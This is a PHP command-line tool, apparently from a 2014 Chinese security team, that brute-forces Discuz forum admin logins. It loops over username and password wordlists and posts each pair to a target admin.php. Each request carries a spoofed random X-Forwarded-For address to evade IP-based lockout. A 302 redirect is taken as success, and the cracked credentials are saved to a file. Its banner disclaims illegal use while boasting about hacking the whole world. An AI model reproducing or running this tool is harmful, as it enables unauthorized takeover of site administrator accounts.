<?php
/**
	Author : fengxuan
	Date : 2014-11-25 
*/

class FuckDiscuz{
	public $userfile;
	public $passfile;
	public $outfile;
	public $url;
	
	public function __construct($argv,$argc){
		$this->init($argv,$argc);
		$this->crack();
	}
	
	
	
	private function init($argv,$argc){
		if(!isset($argv) ||  $argc != 7 || $argv[1]!='-v' || $argv[2]!='-o' ) 	$this->show();
		$this->userfile = $argv[count($argv)-2];
		$this->passfile = $argv[count($argv)-1];
		$this->outfile  = $argv[3];
		$this->url = $argv[count($argv)-3];
	}
	

	
	private function sock_post($url,$query){
		$info = parse_url($url);
		$fp = fsockopen($info['host'],80,$error,$errstr,30);
		$head = "POST  ".$info['path']." HTTP/1.0\r\n";
		$head .= "HOST: ".$info['host']."\r\n";
		$head .= "X-Forwarded-For:  ".$this->X_Forwarded_for()."\r\n";
		$head .="Content-type: application/x-www-form-urlencoded\r\n";
		$head .= "Content-Length: ".strlen(trim($query))."\r\n";
		$head .= "\r\n";
		$head .= trim($query);
		$write = fputs($fp, $head);
		while (!feof($fp)){
			$line = fgets($fp);
			if(preg_match('/HTTP\/1.1 302/i', $line)){
			     $temp = 	explode('&', $query);
			     $temp[0] = substr(strstr($temp[0], '='), 1);
			     $temp[1] = substr(strstr($temp[1], '='), 1);
				echo "\r\n\r\nCongratulations! \r\nThe username is \r\n".$temp[0]."  and password is \r\n".$temp[1]."\r\n";
				$this->savefile($this->outfile, $temp[0] , $temp[1] );
				
			}
			//echo $line."<br>";
		}
	}
	
	private function X_Forwarded_for(){
		$xip = rand(1, 255).".".rand(0, 255).".".rand(0, 255).".".rand(1, 254);
		if (preg_match('#^(10|172\.16|192\.168)\.#', $xip)) {
			continue;
				
		}
		return $xip;
	}
	
	private function savefile($file,$user,$pass){
		$fp = fopen($file, 'w+');
		$string = "username  ".$user."  password  ".$pass."\r\n";
		fwrite($fp, $string);
		fclose($fp);
	}
	
	private function crack(){
		$userfile = file($this->userfile);
		$passfile = file($this->passfile);
	
		$userarr = array();
		$passarr = array();
		foreach ($userfile as $user=>$value){
			$userarr[$user] = $value;
			foreach ($passfile as $pass=>$value){
				$passarr[$pass] = $value;
				$data = array(
						'admin_username'=>$userarr[$user],
						'admin_password'=>$passarr[$pass],
						'submit'=>'提交'
				);
				print "Try crack with: \t".$userarr[$user]." and  \t".$passarr[$pass]."   \r\n";
				$data = str_replace('%0D%0A', '',http_build_query($data));
				$this->sock_post($this->url, $data);
			}
		}
	}
	
	private function show(){

			$string = <<<eof
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+----------Writed by 风炫 Date:2014/11/25------------------+
+-------如果有能力，即使黑了全世界又如何?------------------+
+If there are any problems,please contact:978348306@qq.com-+
+-----we from moon security team blog:www.moonsec.com------+
+----------------只供测试所用,请勿用于非法用途-------------+
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
usage: fuckdz.php  <commands>  <url> <userfile> <passfile>
			
<commands>
			
-v : According to cracking process
-o [file] : The  output file to save
eg:
php.exe fuckdz.php -v -o result.txt http://www.xxx.com/admin.php user.txt pass.txt
			
eof;
			print $string;
		exit();
	}
}

new FuckDiscuz($argv,$argc);

?>